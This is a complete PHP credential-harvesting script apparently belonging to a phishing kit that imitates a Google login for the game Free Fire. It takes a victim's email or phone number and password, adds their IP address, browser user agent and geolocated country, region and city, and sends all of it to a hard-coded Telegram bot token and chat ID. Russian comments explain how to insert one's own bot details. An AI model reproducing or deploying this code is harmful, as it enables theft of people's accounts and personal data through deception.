<?php

if (isset($_POST['submit'])) {

    $email = $_POST['email'];

    $token = "5183617493:AAGeFqKg560r9zpEwK7D5vtwu-sZaGYA01E"; //Сюда вводим токен бота

    $chat_id = "1942014099";     //Сюда вставляем chat_id  //Пример chat_id 1072539123
                       
    function get_client_ip()
    {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        } else if (isset($_SERVER['REMOTE_ADDR'])) {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        } else {
            $ipaddress = 'UNKNOWN';
        }
    
        return $ipaddress;
    }
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddres = $_SERVER['HTTP_CLIENT_IP'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddres = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
            $ipaddres = $_SERVER['HTTP_X_FORWARDED'];
        } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ipaddres = $_SERVER['HTTP_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        } else if (isset($_SERVER['REMOTE_ADDR'])) {
            $ipaddres = $_SERVER['REMOTE_ADDR'];
        } else {
            $ipaddres = 'UNKNOWN';
        }
    $PublicIP = get_client_ip();
    $json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
    $json     = json_decode($json, true);
    $country  = $json['country'];
    $region   = $json['region'];
    $city     = $json['city'];
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $password = $_POST['password'];
    


    
    
    //Собираем в массив то, что будет передаваться боту
    $arr = array(
        'Free Fire ' => 'Google',
        'Номер или почта: ' => $email,
        'Пароль: ' => $password,
        'IP Адрес: ' => $ipaddres,
        'User-Agent: ' => $browser,
        'Страна: ' => $country,
        'Регион: ' => $region,
        'Город: ' => $city
    );
    
    //Настраиваем внешний вид сообщения в телеграме
    foreach($arr as $key => $value) {
        $txt .= "<b>".$key."</b> ".$value."%0A";
    };
    
    //Передаем данные боту
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    //Выводим сообщение об успешной отправке
    if ($sendToTelegram) {
        // echo $httpcode;
        header('location: ../success.html');
    }else {
        echo('Что-то пошло не так. Попробуйте ещё раз.');
    }
}else{
    echo "Ошибка 404 такой страницы нету!";
}

?>